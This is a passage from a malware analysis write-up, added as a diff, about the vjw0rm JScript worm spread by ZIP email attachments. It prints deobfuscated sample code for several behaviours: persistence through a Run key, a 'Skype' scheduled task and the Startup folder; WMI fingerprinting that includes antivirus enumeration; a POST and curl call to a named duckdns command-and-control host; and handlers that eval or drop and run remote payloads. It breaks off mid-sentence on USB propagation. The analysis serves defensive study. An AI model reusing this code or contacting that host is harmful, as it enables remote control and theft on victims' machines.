@@ -1,0 +1,283 @@
+#+author: Arkeopix
+#+email:  jerome.mendiela@protonmail.ch
+#+title:  vjw0rm, an analysis
+#+date:   <2018-01-18 Thu>
+
+* Intro
+  vjw0rm might not be the sexiest malware out there, but it's still good enough to trick users into
+  executing it. It offers a good example of malware behaviour and shows some techniques used by malware author
+  to persists and propagate. This analysis will focus on what vjw0rm does, how and will briefly speculate as to
+  why.
+
+  vjw0rm (refered to as "the sample" for the rest of the document) is a malicious ZIP archive
+  sent as an attachment in an email.
+
+  When executed, the sample will try and persist, gather information about the conputer its being 
+  ran on and enter a loop, making contact with the C2 server to get instructions.
+  
+  the sample is able to execute scripts and arbitraty javascript, self update and propapate itself 
+  through USB devices.
+
+  Sadly i lost the original email, but i remember having a good laugh because it was litteraly asking the user to 
+  run the extracted file file as administrator, "for better performances". 
+
+  #+name: sha256 hash
+  #+begin_src sh
+    $> sha256sum scan-743457657.zip                                          
+    $> 3e1c170dae4154581f7f37e20fcdd85ae39f2a98c7a2b1fdb153a2dfa5bae486  scan-743457657.zip
+  #+end_src
+
+* Mechanisms
+** Obfuscation
+   The sample is really quite simple as the payload is url encoded.
+   All we need to do is calling some kind of urldecode function and get the code itself.
+   As for the code, it is obfuscated with a mix of global variables, references to indexes 
+   in arrays, "getter" functions and almost meaningless names 
+   (=sh= holds the WScript.Shell object, for example). 
+   Nothing anyone familiar with reading code could not understand.
+   
+   I don't feel like this part needs some extra attention.
+  
+** Persitence
+   Upon starting, the sample will try to read the registry key =HKCU\\vjw0rm=, the value will be either
+   TRUE, FALSE or the key will not exist and an exception will be raised. The catch block will set the 
+   key based on the position of the sample relative to the top of a directory.
+
+   #+begin_src js
+     try {
+         // shell.RegRead('HKCU\\vjw0rm')
+         // Reading registry key HKCU\\vjw0rm and storing it into isInTopDir. value is either TRUE or FALSE
+         isInTopDir = shell.RegRead(RegistryEntries[2]);
+     } catch(err) {
+         var sv = ScriptFullName.split("\\");
+         if (":\\" + sv[1] + "== :\\" + ScriptName) { // If script is in top dir (c:\, e:\, etc)
+             isInTopDir = "TRUE";
+             // Writing REG_SZ key HKCU\\vjw0rm with TRUE
+             shell.RegWrite(RegistryEntries[2],isInTopDir,RegistryEntries[5]);
+         } else {
+             isInTopDir = "FALSE";
+             // Writing REG_SZ key HKCU\\vjw0rm with FALSE
+             shell.RegWrite(RegistryEntries[2],isInTopDir,RegistryEntries[5]);
+         }
+     }
+   #+end_src
+   
+   Then the sample will call a function in order to persist, the deobfuscated code is as follow
+   
+   #+begin_src js
+     function Persist() {
+         // Creates a path in tmp for the script
+         var PathToScriptInTMP = GetEnvironementVar("TEMP") + BackSlash + ScriptName;
+         try {
+             // copy file in tmp
+             FileSystem.CopyFile(ScriptFullName,PathToScriptInTMP,true);
+         } catch(err) {
+         }
+         try {
+             // Writes registry REG_SZ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\URCWXKQC01 to start the newly created script in tmp
+             shell.RegWrite(RegistryEntries[0] + RegistryEntries[3] + "URCWXKQC01","\"" + PathToScriptInTMP + "\"",RegistryEntries[5]);
+         } catch(err) {
+         }
+         try {
+             // Create a scheduled task named skype to run the script every 30 minutes 
+             shell.run("Schtasks /create /sc minute /mo 30 /tn Skype /tr \"" + PathToScriptInTMP,false);
+         } catch(err) {
+         }
+         
+         try {
+             // Shell.Application
+             var app = ReturnWindowsTool(2);
+             // Write the script in startup folder. app.NameSpace(7).Self.Path returns path to startup folder
+             FileSystem.CopyFile(ScriptFullName, app.NameSpace(7).Self.Path + "\\" + ScriptName,true);
+         } catch(err) {
+         }
+     }
+   #+end_src
+   
+   As you might see, the sample copies itself in the user temp folder, namely =C:\Users\${USER}\AppData\Local\Temp\${SCRIPT_NAME}=. Then
+   it will try all of the following:
+   1) Add itself to the Run key in HKLM, meaning that on success the script will be executed each time a user logs on.
+      The new key under Run is =URCWXKQC01=
+   2) Create a scheduled task called Skype that triggers an execution every 30 minutes
+   3) Copy itself in the current user startup folder, i.e. =C:\Users\${USER}\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\${SCRIPT_NAME}=
+      
+   As the exceptions are never handled, one could think they're here to hinder readability
+** C2 communications
+   One of the first thing the sample does is building a fingerprint of the computer it being ran on.
+   The details are as follow: 
+   #+begin_src js
+     function FingerPrint() {
+         var serial,NT,i;
+         if (FileSystem.fileexists(GetEnvironementVar("Windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe")) {
+             NT ="YES";
+         } else {
+             NT = "NO";
+         }
+         // windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\
+         serial = HDDSerial + BackSlash + GetEnvironementVar("COMPUTERNAME") + BackSlash + GetEnvironementVar("USERNAME") + BackSlash + GetInfo(2) + BackSlash + GetInfo(4) + BackSlash + BackSlash + NT + BackSlash + isInTopDir + BackSlash;
+         return serial;
+     }
+   #+end_src
+   
+   This piece of code just concatenates different bits of information about the computer in order to create an identity for the computer, which might
+   be used by the C2 server in order to identify and deliver different stages over time.
+   The information is gathered through the [[https://msdn.microsoft.com/en-us/library/aa394525(v%3Dvs.85).aspx][winmgmts]] WMI service, running under the LocalSystem account.
+
+   #+begin_src js
+     function GetInfo(Action) {
+         var s;
+         // Get the os version
+         if (Action == 2) {
+             // GetObject('winmgmts:').InstancesOf('Win32_OperatingSystem');
+             s = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[2]);
+             var en = new Enumerator(s);
+             for (; !en.atEnd();en.moveNext()) {
+                 var it = en.item();
+                 return it.Caption;
+                 break;
+             }
+         }
+         // Enumerate Antivirus product and return the name of the AV
+         if (Action == 4) {
+             var wmg = "winmgmts:\\\\localhost\\root\\securitycenter";
+             // GetObject(wmg).InstancesOf('AntiVirusProduct');
+             s = GetObject(wmg).InstancesOf(WindowsMgmt[3]);
+             var en = new Enumerator(s);
+             for (; !en.atEnd();en.moveNext()) {
+                 var it = en.item();
+                 var str = it.DisplayName;
+             }
+             if (str !== '') {
+                 // Look in winmgmts:\\\\localhost\\root\\securitycenter2
+                 wmg = wmg + "2";
+                 // GetObject(wmg).InstancesOf('AntiVirusProduct');
+                 s = GetObject(wmg).InstancesOf(WindowsMgmt[3]);
+                 en = new Enumerator(s);
+                 for (; !en.atEnd();en.moveNext()) {
+                     it = en.item();
+                     return it.DisplayName;
+                 }
+             } else {
+                 return it.DisplayName;
+             }
+         }
+         // Get the serial number of the hdd
+         if (Action==6) {
+             // GetObject('winmgmts:').InstancesOf('win32_logicaldisk');
+             s = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[1]);
+             var en = new Enumerator(s);
+             for (; !en.atEnd();en.moveNext()) {
+                 var it = en.item();
+                 return it.volumeserialnumber;
+                 break;
+             }
+         }
+     }
+   #+end_src
+   The fingerprint consist of information on OS version, antivirus info and hdd serial
+   
+   Once the fingerprint is ok, the sample will try to contact the C2 server, with the information in the User-Agent.
+   #+begin_src js
+     function PostFingerPrint(ressource,body) {
+         // x = ReturnWindowsTool('XMLHTTP');
+         // curl -A 'windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\' --data ''  http://postventa-vodafone2006.duckdns.org:1993/VreVre
+         var X = ReturnWindowsTool(3);
+         X.open('POST','http://postventa-vodafone2006.duckdns.org:1993/Vre' + ressource, false);
+         X.SetRequestHeader("User-Agent:",FingerPrint());
+         X.send(body);
+         return X.responsetext;
+     }
+   #+end_src
+   The response is then parsed and acted upon. The sample reponds to 7 commands from the C2.
+   - Cl\
+     Self termination. Upon receiving this message the sample will terminate itself
+     #+begin_src js
+       if (Response[0] === "Cl") {
+           WScript.Quit(1);
+       }
+     #+end_src
+   - Sc \
+     Drop file and run it
+     #+begin_src js
+       if (Response[0] === "Sc") {
+           var pathToDrop = GetEnvironementVar("temp") + "\\" + Response[2];
+           var file = FileSystem.CreateTextFile(pathToDrop,true);
+           file.Write(Response[1]);
+           file.Close();
+           shell.run(pathToDrop);
+       }
+     #+end_src
+   - Ex\
+     Executes arbitrary javascript
+     #+begin_src js
+       if (Response[0] === "Ex") {
+           eval(Response[1]);
+       }
+     #+end_src
+   - Rn\
+     Modifies the HDDserial prefix, which is part of the fingerprint. As i was not able to analyse real traffic from the C2 server,
+     i can speculate as to why this would be. My guess is that it might be used as a way to discriminate victims in order to deliver 
+     different stages of the attack.
+     #+begin_src js
+       if (Response[0] === "Rn") {
+           // Opens the script file for reading
+           var scriptr = FileSystem.OpenTextFile(ScriptFullName,1); // ri
+           var scriptContent = scriptr.ReadAll(); // fr
+           scriptr.Close();
+           HDDSerial = HDDSerial.split("_");
+           scriptContent = scriptContent.replace(HDDSerial[0],Response[1]);
+           // Opens the script for writing
+           var scriptw = FileSystem.OpenTextFile(ScriptFullName,2,false); // wi
+           scriptw.Write(scriptContent);
+           scriptw.Close();
+           shell.run("wscript.exe //B \"" + ScriptFullName + "\"");
+           WScript.Quit(1);
+       }
+     #+end_src
+   - Up\
+     This command seems to allow the sample to self update, or at least drop a new version of itself on disk. 
+     As the function changes the "|U|" to "|V|", which is the delimiter used to parse responses from the C2, this looks like a reasonable guess.
+     #+begin_src js
+       if (Response[0] === "Up") {
+           var pathTemp = GetEnvironementVar("temp") + "\\" + Response[2]; // s2
+           var file = FileSystem.CreateTextFile(pathTemp,true); // ctf
+           var content = Response[1]; // gu
+           content = content.replace("|U|","|V|");
+           file.Write(content);
+           file.Close();
+           // Executes the new script in batch mode, hides the window and focus previous window
+           shell.run("wscript.exe //B \"" + pathTemp + "\"",6);
+           WScript.Quit(1);
+       }
+     #+end_src
+   - Un\
+     This command seems to be another way to run arbitraty javascript. However, before running the JS some modifications
+     are made on the string from the server. As one of the modification involves the registry key created under the Run key in HKLM,
+     this seems to be tied to persistence in some way.
+     #+begin_src js
+       if (Response[0] === "Un") {
+           var formatString = Response[1]; // s2
+           var scriptPathTemp = GetEnvironementVar("Temp") + BackSlash + ScriptName;
+           var regi = "URCWXKQC01";
+           formatString = formatString.replace("%f",ScriptFullName).replace("%n",ScriptName).replace("%sfdr",scriptPathTemp).replace("%RgNe%",regi);
+           eval(formatString);
+           WScript.Quit(1);
+       }
+     #+end_src
+   - RF\
+     This just downloads a file and run it
+     #+begin_src js
+       if (Response[0] === "RF") {
+           var pathTemp = GetEnvironementVar("temp") + "\\" + Response[2]; //s2
+           var file = FileSystem.CreateTextFile(s2,true); //fi
+           file.Write(Response[1]);
+           file.Close();
+           shell.run(pathTemp);
+       }
+     #+end_src
+
+** Propagation
+   Everytime the sample tries to contact the C2, it also scan the instances of Win32_LogicalDisk
+   in order to find a USB device and copy itself on it. The sample is copied with the =hidden= and =system= attributes,
+   which means it is suposed to be invisible and cannot be deleted, depending on the rights associated with the execution.
+   Then, the sample scan for the content 
